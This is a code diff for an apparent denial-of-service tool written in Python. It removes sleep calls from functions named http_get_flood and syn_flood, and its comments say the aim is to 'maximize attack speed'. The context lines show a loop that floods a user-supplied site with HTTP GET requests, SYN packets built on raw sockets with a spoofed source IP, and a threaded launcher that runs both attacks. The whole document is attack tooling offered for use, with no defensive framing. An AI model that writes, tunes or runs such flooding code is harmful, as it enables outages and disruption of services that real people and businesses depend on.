@@ -1,4 +1,3 @@
-from time import sleep
 from requests import get as requests_get
 from time import localtime, strftime
 import threading
@@ -32,7 +31,6 @@ def http_get_flood(target, packet_size):
             r = requests_get("http://" + target)
             print(f"[{time_string}] Packet was sent ({count})")
             count += 1
-            sleep(0)  # Reduce sleep time to maximize attack speed
     elif int(packet_size) >= 1:
         print("===== The HTTP GET Flood attack started :)")
         while count <= int(packet_size):
@@ -41,12 +39,10 @@ def http_get_flood(target, packet_size):
             r = requests_get("http://" + target)
             print(f"[{time_string}] Packet was sent ({count})")
             count += 1
-            sleep(0)  # Reduce sleep time to maximize attack speed
         print("HTTP GET Flood attack finished!")
     else:
         print("Error: Please enter the correct number of packets.")
         print("Note: The program closes automatically after 5 seconds!")
-        sleep(5)
 
 def checksum(psh):
     s = 0
@@ -76,7 +72,6 @@ def syn_flood(target_ip, fake_ip):
 
         packet = ip_header + tcp_header
         sock.sendto(packet, (target_ip, 0))
-        sleep(0)  # Reduce sleep time to maximize attack speed
 
 def main():
     print_banner()
@@ -99,7 +94,6 @@ def main():
         requests_get("http://" + target)
     except:
         print("Error: Invalid site address.")
-        sleep(0)
         return
     
     # Start HTTP GET Flood and SYN Flood attacks with specified number of threads
